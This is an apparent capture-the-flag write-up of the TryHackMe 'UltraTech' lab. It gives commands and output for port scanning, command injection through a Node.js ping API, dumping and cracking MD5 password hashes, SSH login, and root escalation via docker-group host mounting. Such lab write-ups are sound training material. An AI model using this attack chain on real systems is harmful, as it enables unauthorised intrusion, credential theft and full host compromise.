---
room: UltraTech
url: https://tryhackme.com/room/ultratech1
category: web
difficulty: Medium
os: Linux
tags: [nmap, nodejs, api, command-injection, sqlite, hashcat, docker, privesc]
status: complete
started: 2026-09-09
completed: 2026-09-09
---

# UltraTech

> A Node.js/Express API on port 8081 exposes a `ping` endpoint that passes its
> parameter straight to a shell. Command injection through it reads the app's
> SQLite database, leaking two MD5 password hashes. Cracking the `r00t` hash
> gives SSH access, and `r00t`'s membership of the `docker` group escalates
> straight to root via a mounted-host container.

| | |
|---|---|
| **Room** | [UltraTech](https://tryhackme.com/room/ultratech1) |
| **Difficulty** | Medium |
| **Target OS** | Linux (Ubuntu) |
| **Attack path** | recon -> API command injection -> SQLite creds -> crack -> SSH -> docker group -> root |

---

## 1. Recon

### Port scan

```bash
export IP=10.49.172.131
nmap -sC -sV -p- -T4 --min-rate=1000 $IP
```

| Port | Service | Version | Notes |
|---|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.5 | |
| 22/tcp | ssh | OpenSSH 8.2p1 (Ubuntu) | final login vector |
| 8081/tcp | http | Node.js Express | REST API, CORS allows PUT/DELETE/PATCH |
| 31331/tcp | http | Apache 2.4.41 (Ubuntu) | main site "UltraTech - The best of technology" |

The Node.js API on **8081** and the Apache site on **31331** are the two things
worth chasing. FTP and SSH need credentials first.

---

## 2. Enumeration

### Directory brute force on 31331

```bash
gobuster dir -u http://$IP:31331/ -w /usr/share/wordlists/dirb/big.txt -t 100 -x php,txt,js,html,bak
```

Interesting hits:

```
css/            (301)
images/         (301)
index.html      (200)
javascript/     (301)
js/             (301)
partners.html   (200)
robots.txt      (200)
what.html       (200)
```

### Finding the API

Reading the site's JavaScript revealed a route pointing at the Node.js service on
port **8081**, including its API parameters. The API exposes a `ping` endpoint
that takes an IP address and pings it server-side.

### Confirming command execution

Point the endpoint at the attacker box and sniff for the ICMP that proves the
server actually runs the command:

```bash
sudo tcpdump -i tun0 icmp
```

```
03:54:57.818344 IP 10.49.172.131 > 192.168.140.168: ICMP echo request, id 35, seq 1, length 64
03:54:57.818384 IP 192.168.140.168 > 10.49.172.131: ICMP echo reply,   id 35, seq 1, length 64
```

The target pings back, so the parameter reaches a shell. That is a **command
injection** primitive: the value is concatenated into a `ping` call, and a
backtick (`` ` ``, ASCII 96) breaks out of it to run arbitrary commands.

---

## 3. Foothold

### Command injection -> read the database

The Express app stores users in a local SQLite file (`utech.db.sqlite`). Injecting
a command through the `ping` parameter dumps its contents into the response /
error output:

```
...Mr00tf357a0c52799563c7c7b76c1e7543a32...Madmin0d0ea5111e3c1def594c1684e3b9be84...
```

Two accounts with MD5 password hashes:

| User | MD5 hash |
|---|---|
| r00t | `f357a0c52799563c7c7b76c1e7543a32` |
| admin | `0d0ea5111e3c1def594c1684e3b9be84` |

> The same injection can be turned into a full reverse shell by writing a bash
> payload and having the API download and execute it, but the credentials are
> the faster route in here.

### Crack the hash

```bash
echo 'f357a0c52799563c7c7b76c1e7543a32' > hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```
f357a0c52799563c7c7b76c1e7543a32:n100906
```

So `r00t` / `n100906`.

### SSH in

```bash
ssh r00t@$IP        # password: n100906
```

```
r00t@ip-10-49-172-131:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
```

Foothold as `r00t`.

---

## 4. Privilege escalation

`r00t` is in the **docker** group. Membership of `docker` is effectively root:
you can run a container that mounts the whole host filesystem and chroot into it.

```bash
docker images
# REPOSITORY   TAG      IMAGE ID       CREATED       SIZE
# bash         latest   495d6437fc1e   7 years ago   15.8MB

docker run -v /:/mnt --rm -it bash chroot /mnt sh
```

```
# whoami
root
```

Root shell obtained. The host's `/` is mounted at `/mnt` inside the container, so
`chroot` gives full root access to the real filesystem - including reading
`/root/.ssh/id_rsa`.

---

## 5. Flags

Both flags are read from the mounted host filesystem as root. Values kept local.

| Flag | Location |
|---|---|
| User | in `r00t`'s home |
| Root | in `/root` |

---

## 6. Key answers

- **Open ports:** 21, 22, 8081, 31331
- **Framework on 8081:** Node.js / Express
- **Vulnerability:** command injection in the API `ping` parameter
- **Credential store:** `utech.db.sqlite` (SQLite)
- **Cracked password (r00t):** `n100906`
- **Privesc vector:** `docker` group membership

---

## 7. Lessons learned

- Read a site's JavaScript early - it exposed the whole 8081 API surface that the
  landing page hid.
- When a parameter might reach a shell, prove it out-of-band with `tcpdump` on
  ICMP before wasting time guessing injection syntax.
- `docker` group == root. `docker run -v /:/mnt ... chroot /mnt sh` is the
  standard escape and worth memorising.

## 8. References

- Docker group privesc: `notes/cheatsheets/docker-group-privesc.md` (GTFOBins: https://gtfobins.github.io/gtfobins/docker/)
- Hashcat example hashes (MD5 = mode 0): https://hashcat.net/wiki/doku.php?id=example_hashes
- Command injection: `notes/cheatsheets/command-injection.md` (OWASP: https://owasp.org/www-community/attacks/Command_Injection)
